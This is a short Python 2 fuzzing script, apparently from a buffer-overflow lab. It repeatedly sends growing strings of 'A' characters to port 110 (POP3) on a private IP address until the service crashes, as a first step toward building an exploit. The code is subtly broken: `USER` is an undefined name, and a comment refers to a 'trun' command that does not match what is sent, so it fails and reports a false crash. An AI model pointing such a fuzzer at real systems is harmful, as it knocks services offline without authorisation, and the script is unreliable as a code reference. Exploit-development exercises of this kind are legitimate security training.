#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.1.213',110))
		#previously determined trun was a vulnerable command
		s.send((USER + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
